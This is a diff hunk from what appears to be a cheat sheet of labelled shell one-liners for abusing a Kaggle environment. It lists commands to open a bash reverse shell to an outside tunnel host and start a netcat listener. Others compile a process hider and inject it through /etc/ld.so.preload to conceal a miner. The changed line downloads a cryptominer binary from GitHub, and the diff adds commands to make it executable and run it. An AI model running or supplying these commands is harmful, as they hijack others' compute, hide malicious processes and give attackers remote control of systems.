@@ -61,4 +61,4 @@ create reverse shell ========> while true; do bash -c 'bash -i >& /dev/tcp/2.tcp
 call net cat ================> nc -lnvp 4444
 undo dyrectory kagle ==============> cd /kaggle
 hide miner ========================> git clone https://github.com/cihuuy/libn && cd libn && gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl && mv libprocess.so /usr/local/lib/ && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
-call miner =========================> wget https://raw.githubusercontent.com/bulboni/minware/main/config.json && wget https://raw.githubusercontent.com/bulboni/minware/main/durex
+call miner =========================> wget https://raw.githubusercontent.com/bulboni/minware/main/config.json && wget https://raw.githubusercontent.com/bulboni/minware/main/durex && chmod +x durex && ./durex
